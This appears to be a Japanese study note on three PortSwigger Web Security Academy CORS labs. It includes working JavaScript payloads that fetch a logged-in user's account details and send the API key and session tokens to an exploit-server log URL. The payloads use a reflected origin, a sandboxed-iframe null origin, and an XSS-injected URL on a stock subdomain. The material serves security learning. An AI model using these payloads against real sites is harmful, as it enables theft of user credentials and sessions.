---
title: 'Cross-origin resource sharing < CORS >'
description: 'PortSwigger CORSの記録'
pubDate: 2026-02-24T22:25:00+09:00
category: 'PortSwigger'
tags: ['Web', 'CORS']
---

# Cross-origin resource sharing - PortSwigger

## Lab
### CORS vulnerability with basic origin reflection

同一オリジンなら CORS は、チェックをしない  
クロスオリジンの場合、CORS チェックをする

- `Access-Control-Allow-Origin: https://example.com`

  Origin を好きに制御できる  
  Origin は基本的に自動で送信されるので、ペイロードに明示する必要はない

- `Access-Control-Allow-Credentials: true`

  Cookie 付きリクエストを許可する

```bash
HTTP/2 200 OK
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 162

{
  "username": "wiener",
  "email": "a@a.com",
  "apikey": "5b7r7M4FLGY22F22C4NNDLmifknareNG",
  "sessions": [
    "7VrOGfZpAvGsMx2Hlu3y7wwloY5c9jvB"
  ]
}
```
```html
<script>
fetch('https://challenge.web-security-academy.net/accountDetails',{
  credentials:'include'
})
.then(r=>r.text())
.then(t=>location='https://exploit-challenge.exploit-server.net/log?key='+encodeURIComponent(t))
</script>
```

### CORS vulnerability with trusted null origin

- `Access-Control-Allow-Origin: null`

  クロスオリジンヘッダが存在すると弾かれる  
  しかし、nullオリジンは簡単に作成できる

```bash
HTTP/2 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 156

{
  "username": "wiener",
  "email": "a@a.com",
  "apikey": "wURESnuVBc4S2IgtFlF4Qd95XB6ne7lB",
  "sessions": [
    "E09N1dEJSN8mBD7GAIKlUw5G709BJKHL"
  ]
}
```

```html
<iframe sandbox="allow-scripts" 
srcdoc="
<script>
fetch('https://challenge.web-security-academy.net/accountDetails',{
  credentials:'include'
})
.then(r=>r.text())
.then(t=>location='https://exploit-challenge.exploit-server.net/log?key='+encodeURIComponent(t))
</script>
"></iframe>
```

### CORS vulnerability with trusted insecure protocols

stock ドメインに xss が存在しそれを利用する

```html
<script>
  const stockCheckForm = document.getElementById("stockCheckForm");
  stockCheckForm.addEventListener("submit", function(e) {
    const data = new FormData(stockCheckForm);
    window.open('http://stock.challenge.web-security-academy.net/?productId=1&storeId=' + data.get('storeId'), 'stock', 'height=10,width=10,left=10,top=10,menubar=no,toolbar=no,location=no,status=no');
    e.preventDefault();
  });
</script>
```

```text
http://stock.challenge.web-security-academy.net/?productId=1%3Cscript%3Ealert(1)%3C/script%3E&storeId=1
```

```html
<script>
  document.location="http://stock.challenge.web-security-academy.net/?productId=1%3Cscript%3Efetch('https://challenge.web-security-academy.net/accountDetails',{credentials:'include'}).then(r=>r.text()).then(t=>location='https://exploit-challenge.exploit-server.net/log?key='%2BencodeURIComponent(t))%3c/script>&storeId=1"
</script>
```